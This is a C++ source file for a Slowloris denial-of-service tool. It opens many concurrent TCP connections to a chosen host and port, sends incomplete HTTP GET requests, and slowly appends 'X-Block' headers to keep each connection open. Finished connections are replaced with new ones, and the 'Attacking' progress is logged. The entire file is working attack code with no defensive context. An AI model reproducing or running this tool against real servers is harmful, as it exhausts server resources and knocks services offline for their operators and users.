#include "slowloris.h"

int concurrency, threads, speed, blocks, interval, expires;
string dest, port, location;
bool debug;
ofstream fout;

void launchSlowloris(Options option) {
	concurrency = stoi(option["concurrency"]);
	threads = stoi(option["threads"]);
	speed = stoi(option["speed"]);
	blocks = stoi(option["blocks"]);
	interval = stoi(option["expires"]);
	dest = option["dest"];
	port = option["port"];
	location = option["location"];
	debug = stoi(option["debug"]);

	io_service io;
	deadline_timer timer(io);
	fout.open((format("%1%.txt") % dest).str());

	fout << format("Attacking %1%:%2% %3% with concurrency=%4%, threads=%5%, speed=%6%, blocks=%7%, interval=%8%, expires=%9%, debug=%10%") % dest % port % location % concurrency % threads % speed % blocks % interval % expires % debug << endl << endl;

	requestFactory(&io, &timer, 0);
	
	thread_group group;
	for(int i = 1; i < threads; i++){
		group.create_thread(bind(&io_service::run, &io));
	}

	io.run();
	group.join_all();
}

void requestFactory(io_service* io, deadline_timer* timer, int id) {
	new Request(*io, id++);

	if(id < concurrency) {
		timer->expires_from_now(posix_time::millisec(speed));
		timer->async_wait(bind(requestFactory, io, timer, id));
	}
}


Request::Request(io_service& io, int id) : id(id), count(0) {
	timer = new deadline_timer(io, posix_time::seconds(interval));
	stream = new ip::tcp::iostream(dest, port);
	start();
}

Request::~Request() {
	delete timer;
	delete stream;
}

void Request::start() {
	fout << format("Start  %1%") % id << endl;

	*stream << format(
		"GET %1% HTTP/1.1\r\n"
		"Host: %2%\r\n"
		"User-Agent: Boost.Asio\r\n"
		"Accept: */*\r\n"
		"Connection: Keep-Alive\r\n"
	) % location % dest;

	stream->flush();
	timer->expires_from_now(posix_time::seconds(interval));
	timer->async_wait(bind(&Request::append, this));
}

void Request::append() {
	fout << format("Append %1%->%2%") % id % count << endl;
	*stream << format("X-Block: %1%\r\n") % count++;
	stream->flush();

	if (count < blocks) {
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::append, this));
	} else {
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::finish, this));
	}
}

void Request::finish() {
	*stream << "\r\n";
	stream->flush();
	fout << format("Finish %1%") % id << endl;

	if(debug){
		fout << stream->rdbuf() << endl;
	}

	new Request(timer->get_io_service(), id + concurrency);
	timer->expires_from_now(posix_time::seconds(expires));
	timer->async_wait(bind(&Request::close, this));
}

void Request::close(){
	fout << format("Close  %1%") % id << endl;
	delete this;
}
